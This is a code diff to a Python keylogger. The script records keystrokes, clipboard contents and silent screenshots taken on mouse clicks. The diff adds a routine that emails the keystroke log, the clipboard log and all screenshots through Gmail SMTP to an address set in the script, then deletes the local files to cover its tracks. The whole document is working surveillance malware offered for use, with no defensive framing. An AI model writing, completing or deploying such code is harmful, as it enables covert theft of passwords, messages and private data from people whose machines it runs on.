@@ -7,6 +7,10 @@ from email.message import EmailMessage
 import subprocess
 import shutil
 
+email_user = "YOUR USERNAME"
+email_password = "YOUR PASSWORD"
+send_to = "SEND TO EMAIL ADDRESS"
+
 log_file = open("log.txt", "w")
 clipboard_file = open("clipboard.txt", "w")
 
@@ -33,7 +37,7 @@ def on_release(key):
     
 def take_screenshot():
     global count
-    filename = f'sc{str(count)}.png'
+    filename = f'screenshot{str(count)}.png'
     outfile = os.path.join(folder, filename)
     count += 1
     outcmd = "{} {} {}".format('screencapture', '-x', outfile)
@@ -47,13 +51,35 @@ def on_click(x, y, button, pressed):
         take_screenshot()
         
 def cleanup():
-    listener2.stop()
-    log_file.close()
-    clipboard_file.close()
     shutil.rmtree(folder)
     os.remove("log.txt")
     os.remove("clipboard.txt")
+
+def send_email():
+    msg = EmailMessage()
+    msg['Subject'] = "Keylogger"
+    msg['From'] = email_user
+    msg['To'] = send_to
+    
+    with open("log.txt", 'rb') as f:
+        file_data = f.read()
+    msg.add_attachment(file_data, maintype='text', subtype='txt', filename="log.txt")
+    
+    with open("clipboard.txt", 'rb') as f:
+        file_data = f.read()
+    msg.add_attachment(file_data, maintype='text', subtype='txt', filename="clipboard.txt")
+    
+    for file in os.listdir(folder):
+        with open(folder+"/"+file, 'rb') as f:
+            file_data = f.read()
+        msg.add_attachment(file_data, maintype='image', subtype='png', filename=file)
         
+    with smtplib.SMTP('smtp.gmail.com', 587) as s:
+        s.starttls()
+        s.login(user = email_user, password= email_password)
+        s.sendmail(from_addr = msg["From"], to_addrs= msg["To"], msg = msg.as_string())
+        s.quit()
+
 folder = os.path.join(os.getcwd(), 'screenshot_folder')
 if os.path.isdir(folder) == False:
     os.mkdir(folder)
@@ -71,4 +97,9 @@ while (listener.is_alive()):
         continue
     text = paste(format='text')
     clipboard_file.write(text+"\n")
+
+listener2.stop()
+log_file.close()
+clipboard_file.close()
+send_email()
 cleanup()
